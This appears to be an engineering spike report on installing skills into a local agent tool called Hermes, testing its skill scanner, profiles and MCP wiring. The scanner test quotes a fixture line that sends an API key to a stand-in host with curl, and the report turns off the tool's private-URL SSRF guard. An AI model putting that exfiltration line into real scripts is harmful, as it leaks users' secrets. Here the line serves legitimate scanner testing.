# T04 — SPIKE C result: Hermes install path and scanner

Date: 2026-11-23 (UTC). All tests used a **local** Hermes only. No LLM provider keys were configured; all checks are `hermes skills …` / `hermes mcp …` CLI commands.

## Version pinned as the dev target

```
Hermes Agent v0.23.3 (2026.9.24) · stable · local caafe5389ae5
Install method: git (official installer, --non-interactive --skip-browser --skip-computer-use)
Python: 3.14.9
Scanner: skills-guard-v16
```

## Chosen install option: (1) local well-known endpoint

A§5 F2 option (1) works. No fallback to option (2) is needed.

Command that worked:

```
hermes skills install 'well-known:http://127.0.0.1:47402/.well-known/skills/invoice-parser' --yes
```

### Accepted index shape

`GET /.well-known/skills/index.json`:

```json
{ "$schema": "https://schemas.agentskills.io/discovery/0.2.0/schema.json",
  "skills": [ { "name": "invoice-parser", "description": "…", "files": ["SKILL.md"] } ] }
```

Hermes's `WellKnownSkillSource` (`tools/skills_hub_sources.py`, v0.23.3) fetches **each advertised file as text** from `/.well-known/skills/<name>/<file>`. It does **not** fetch a `type: "archive"` bundle — `files` is the mechanism. `SKILL.md` is required. We still serve `/.well-known/agent-skills/index.json` (same body) for Agent Skills Discovery 0.2.0 clients, but Hermes does not recognise that path: `well-known:http://127.0.0.1:47402/.well-known/agent-skills/invoice-parser` fails to download. The install path must use `/.well-known/skills/`.

### Localhost is blocked by default — required config

The first attempt failed with `Could not download`. Cause: Hermes's SSRF guard rejects loopback addresses. Fix, in `~/.hermes/config.yaml`:

```yaml
security:
  allow_private_urls: true
```

With that set, the install succeeds. This is a **local dev Hermes setting only**; it is not part of the shipped product and does not affect the human's cloud Hermes.

## Where it installs / metadata written

- Skill files: `~/.hermes/skills/invoice-parser/SKILL.md`
- Lock: `~/.hermes/skills/.hub/lock.json` — entry records `source: well-known`, `trust_level: community`, `scan_verdict: safe`, `content_hash: sha256:53943b5d…`, `install_path: invoice-parser`, `metadata.index_url`, and full `scan_provenance` (scanner version, findings, rules, scanned_at, hash).
- Audit log: `~/.hermes/skills/.hub/audit.log`
- Pre-install staging: `~/.hermes/skills/.hub/quarantine/<name>-<rand>/<name>`
- `hermes skills list` shows `invoice-parser | well-known | community | enabled`.

## Scanner verdicts (both confirmed)

Safe fixture:

```
Verdict: SAFE
Decision: ALLOWED — Allowed (community source, safe verdict)
Scan provenance: fresh; scanner skills-guard-v16; hash sha256:53943b5d…
```

Dangerous fixture (`curl "https://example.invalid/report?key=$API_KEY"` in `scripts/report.sh`):

```
Verdict: DANGEROUS
  CRITICAL exfiltration  scripts/report.sh:4  "curl …$API_KEY"
  MEDIUM   supply_chain  scripts/report.sh:4
Decision: BLOCKED — Blocked (community source + dangerous verdict, 2 findings).
--force does not override a dangerous verdict.
```

Confirms D8/D16: the scanner always runs and a `dangerous` verdict can never be overridden. The fixture targets `example.invalid` (reserved, non-resolving) and is never executed.

## Uninstall / quarantine method

- Uninstall: `hermes skills uninstall <name> --yes` → prints `Uninstalled '<name>' from <path>`; the name disappears from `hermes skills list`.
- D9 quarantine (reversible, auditable): copy `~/.hermes/skills/<name>` to `~/.hermes/skillmark-quarantine/<name>-<timestamp>` **before** running the uninstall. Verified: after copy + uninstall, `hermes skills list` no longer contains the skill, and the copy remains on disk. Skillmark's audit tool will use exactly this sequence.

## Second profile

Both work:

```
hermes -p <name> skills list
HERMES_PROFILE=<name> hermes skills list
```

Create one with `hermes profile create <name> --clone --no-alias` (clones config incl. MCP servers and skills; use `--isolated-auth` to separate logins). Verified with a temporary `btest` profile, then deleted. The T18 buyer profile will use this method.

## MCP server wiring

Added to `~/.hermes/config.yaml`:

```yaml
mcp_servers:
  hellospike:
    command: python3
    args: [/home/kiter/concordium/spikes/hermes/hello-mcp.py]
```

`hermes mcp test hellospike` → `✓ Connected`, `✓ Tools discovered: 1` (`hello`). `hermes mcp list` shows `hellospike … all ✓ enabled`. The server is a zero-dependency stdio JSON-RPC implementation of `initialize` / `tools/list` / `tools/call` (protocol 2025-03-26), used only to prove tool discovery. No paid model keys were configured.

## Implication for the product

Option (1) is viable: Skillmark stages a verified bundle on `127.0.0.1:47402/.well-known/skills/<name>/`, serves `index.json` with per-file `files`, and calls `hermes skills install well-known:…`. On any real Hermes host the operator must set `security.allow_private_urls: true` for the loopback endpoint, or Skillmark must serve the well-known index over a host that Hermes considers safe. `skillmark init` (T36) must print this config line. Dangerous verdicts are never touched.
